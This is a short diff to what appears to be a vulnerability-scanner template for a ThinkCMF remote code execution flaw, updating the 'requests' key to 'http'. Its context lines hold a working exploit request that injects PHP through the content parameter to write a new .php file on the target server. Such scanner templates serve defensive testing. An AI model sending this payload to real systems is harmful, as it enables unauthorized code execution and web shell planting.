@@ -7,7 +7,7 @@ info:
   reference: https://www.freebuf.com/vuls/217586.html
   tags: thinkcmf,rce
 
-requests:
+http:
   - raw:
       - |
         GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo phpinfo();\");')}} HTTP/1.1
